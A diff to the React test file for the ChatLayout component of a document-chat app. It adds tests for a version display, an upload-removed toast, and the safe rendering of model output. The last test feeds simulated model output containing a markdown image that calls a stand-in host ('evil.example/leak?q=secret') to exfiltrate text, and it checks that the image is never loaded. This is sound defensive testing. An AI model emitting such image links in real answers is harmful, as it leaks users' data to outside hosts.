@@ -5,6 +5,8 @@ import { MemoryRouter, Route, Routes, useLocation } from 'react-router'
 import ChatLayout from './ChatLayout'
 import { AuthProvider } from '../../services/AuthContext'
 import * as api from '../../services/api'
+import { version } from '../../../package.json'
+import snapshot from '../../../../backend/tests/openapi_snapshot.json'
 import { chatReply, documentList, documentRecord, documentStatus, done, session, SOURCE, turn } from '../../test/fixtures'
 
 vi.mock('../../services/api', async (importOriginal) => ({
@@ -599,5 +601,41 @@ describe('ChatLayout', () => {
     await act(async () => read(documentStatus({ id: 12, filename: 'plan.pdf', status: 'ready', pages: 2, chunks: 5 })))
     await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('Added plan.pdf: 5 passages from 2 pages.', 'success'))
     expect(screen.getByText('Add a document')).toBeTruthy()
+  })
+
+  it('shows the version, the same as the API\'s, under Settings, System', async () => {
+    renderChat('/settings')
+    const user = userEvent.setup()
+    const sheet = await screen.findByRole('dialog', { name: 'Settings' })
+    await user.click(within(sheet).getByRole('radio', { name: 'System' }))
+    expect(screen.getByText('Version').previousElementSibling?.textContent).toBe(version)
+    expect(version).toBe(snapshot.info.version)
+  })
+
+  it('says a file was removed before it was read, not that something failed', async () => {
+    vi.mocked(api.uploadDocument).mockResolvedValue({ document_id: 13, filename: 'plan.pdf', status: 'processing', replaces: false, message: "Reading 'plan.pdf'." })
+    vi.mocked(api.getDocument).mockReset()
+    vi.mocked(api.getDocument).mockRejectedValue(new api.ApiError('No such document.', 404))
+    const { addToast } = renderChat()
+    const user = userEvent.setup()
+    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['%PDF'], 'plan.pdf', { type: 'application/pdf' }))
+    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('plan.pdf was removed before it was read.', 'info'))
+    expect(addToast).not.toHaveBeenCalledWith('No such document.', 'error')
+  })
+
+  it('loads no image an answer names, and opens its links in a new tab (S3)', async () => {
+    // Model output is untrusted: an image URL could carry text out, and a link in the same tab
+    // would end the session held in memory
+    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
+      onToken?.('See ![chart](https://evil.example/leak?q=secret) and [the manual](https://example.com/manual).')
+      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 50 }))
+    })
+    renderChat()
+    await ask('Show me')
+    const link = await screen.findByRole('link', { name: 'the manual' })
+    expect(link.getAttribute('target')).toBe('_blank')
+    expect(link.getAttribute('rel')).toBe('noopener noreferrer')
+    expect(document.querySelector('img')).toBeNull()
+    expect(document.body.innerHTML).not.toContain('evil.example')
   })
 })
